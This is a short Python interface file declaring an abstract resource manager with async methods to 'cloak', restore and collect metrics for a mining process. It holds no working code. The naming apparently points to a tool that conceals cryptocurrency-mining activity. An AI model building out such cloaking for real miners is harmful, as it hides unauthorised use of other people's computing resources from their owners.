# interfaces.py

from abc import ABC, abstractmethod
from typing import Any, Dict

from .app.mining_environment.scripts.utils import MiningProcess

class IResourceManager(ABC):
    @abstractmethod
    async def enqueue_cloaking(self, process: MiningProcess):
        pass

    @abstractmethod
    async def enqueue_restoration(self, process: MiningProcess):
        pass

    @abstractmethod
    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        pass

    @abstractmethod
    async def restore_resources(self, process: MiningProcess) -> bool:
        pass
